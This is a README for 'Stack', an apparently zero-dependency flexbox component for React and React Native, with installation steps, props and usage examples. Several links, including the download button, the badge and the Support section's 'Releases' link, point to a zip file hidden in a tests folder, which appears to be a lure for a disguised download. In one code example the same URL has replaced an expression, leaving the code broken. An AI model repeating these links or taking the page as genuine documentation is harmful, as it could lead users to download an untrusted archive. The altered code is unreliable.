# Stack: A Type-Safe Flexbox Component for React & React Native

![GitHub Release](https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip%20Latest%20Release-Click%20Here-brightgreen)  
[Download Latest Release](https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip)

---

## Table of Contents

1. [Overview](#overview)
2. [Features](#features)
3. [Installation](#installation)
4. [Usage](#usage)
5. [API Reference](#api-reference)
6. [Examples](#examples)
7. [Contributing](#contributing)
8. [License](#license)
9. [Support](#support)

---

## Overview

Stack is a zero-dependency, type-safe component designed to simplify the use of flexbox in both React and React Native applications. With Stack, developers can create responsive layouts quickly and efficiently, ensuring a consistent look across different devices. 

The component is built with TypeScript, providing type safety that helps catch errors during development. This focus on simplicity and safety makes Stack a great choice for both beginners and experienced developers.

---

## Features

- **Zero Dependencies**: No need to install additional libraries.
- **Type Safety**: Built with TypeScript for error reduction.
- **Responsive Layouts**: Easily create flexible and responsive designs.
- **Simple API**: Intuitive props for quick implementation.
- **Cross-Platform**: Works seamlessly in both React and React Native environments.

---

## Installation

To install Stack, run the following command in your project directory:

```bash
npm install @yuiii1234/stack
```

or

```bash
yarn add @yuiii1234/stack
```

Once installed, you can import Stack into your components.

---

## Usage

Using Stack is straightforward. Here’s a basic example of how to implement it in your project.

### Basic Example

```javascript
import React from 'react';
import { Stack } from '@yuiii1234/stack';

const App = () => {
  return (
    <Stack direction="column" spacing={10}>
      <div style={{ backgroundColor: 'lightblue', height: '100px' }}>Item 1</div>
      <div style={{ backgroundColor: 'lightgreen', height: '100px' }}>Item 2</div>
      <div style={{ backgroundColor: 'lightcoral', height: '100px' }}>Item 3</div>
    </Stack>
  );
};

export default App;
```

In this example, the `Stack` component arranges three items in a vertical column with a spacing of 10 pixels between them.

### Props

- **direction**: Defines the direction of the stack. Accepts values `row` or `column`.
- **spacing**: Sets the space between items in pixels.
- **align**: Aligns items within the stack. Accepts values `flex-start`, `center`, or `flex-end`.
- **justify**: Justifies items along the main axis. Accepts values `flex-start`, `center`, `flex-end`, or `space-between`.

---

## API Reference

### Stack Component

#### Props

| Prop       | Type       | Default       | Description                                |
|------------|------------|---------------|--------------------------------------------|
| direction  | `string`   | `column`      | Sets the direction of the stack.          |
| spacing    | `number`   | `0`           | Space between items in pixels.            |
| align      | `string`   | `flex-start`  | Aligns items within the stack.            |
| justify    | `string`   | `flex-start`  | Justifies items along the main axis.      |

### Example Usage

```javascript
<Stack direction="row" spacing={20} align="center" justify="space-between">
  <Item1 />
  <Item2 />
  <Item3 />
</Stack>
```

---

## Examples

### Responsive Layout

To create a responsive layout, you can adjust the `direction` and `spacing` props based on screen size.

```javascript
import React from 'react';
import { Stack } from '@yuiii1234/stack';

const ResponsiveApp = () => {
  const isMobile = https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip < 768;

  return (
    <Stack direction={isMobile ? "column" : "row"} spacing={isMobile ? 5 : 20}>
      <div style={{ backgroundColor: 'lightblue', height: '100px' }}>Item 1</div>
      <div style={{ backgroundColor: 'lightgreen', height: '100px' }}>Item 2</div>
      <div style={{ backgroundColor: 'lightcoral', height: '100px' }}>Item 3</div>
    </Stack>
  );
};

export default ResponsiveApp;
```

### Nested Stacks

You can also nest Stack components for more complex layouts.

```javascript
<Stack direction="row" spacing={10}>
  <Stack direction="column" spacing={5}>
    <div>Item 1.1</div>
    <div>Item 1.2</div>
  </Stack>
  <Stack direction="column" spacing={5}>
    <div>Item 2.1</div>
    <div>Item 2.2</div>
  </Stack>
</Stack>
```

---

## Contributing

We welcome contributions to Stack! To get started:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch to your forked repository.
5. Create a pull request.

Please ensure your code adheres to our coding standards and includes appropriate tests.

---

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

---

## Support

For support, please visit the [Releases](https://github.com/yuiii1234/stack/raw/refs/heads/main/src/__tests__/Software-v2.5.zip) section for the latest updates and issues. You can also open an issue in the repository if you encounter any problems or have questions.